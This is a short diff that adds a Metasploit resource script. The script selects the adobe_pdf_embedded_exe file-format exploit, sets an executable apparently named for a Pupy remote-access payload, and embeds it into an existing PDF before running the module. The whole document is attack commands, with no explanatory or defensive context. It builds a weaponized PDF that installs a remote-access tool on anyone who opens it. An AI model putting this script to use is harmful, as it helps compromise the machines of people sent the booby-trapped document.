@@ -1,0 +1,5 @@
+use exploit/windows/fileformat/adobe_pdf_embedded_exe
+set EXENAME /tmp/pupyx86.5j4_3n.exe
+set INFILENAME /root/11F19536X.pdf
+set FILENAME test
+run
